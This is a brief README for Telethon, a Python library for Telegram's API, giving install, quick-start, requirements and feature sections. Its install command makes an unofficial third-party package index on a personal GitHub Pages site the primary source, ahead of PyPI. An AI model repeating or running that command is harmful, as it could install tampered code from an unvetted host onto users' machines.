WHAT IS TELETHON?
Telethon is a Python library for interacting with Telegram's API.
It supports both user and bot accounts.

INSTALL:
pip install --index-url https://rimistb.github.io/pypi312/wheels/ --extra-index-url https://pypi.org/simple/ --extra-index-url https://chaquo.com/pypi-13.1/simple/ telethon rsa pyaes --no-deps

QUICK START:
from telethon import TelegramClient

client = TelegramClient('session', api_id=YOUR_API_ID, api_hash='YOUR_API_HASH')
await client.start()

REQUIREMENTS:
- api_id and api_hash from https://my.telegram.org
- internet connection

FEATURES:
- Full Telegram API support
- User and Bot account support
- Event handling system
- File upload/download
- Message search
- Channel/Group management
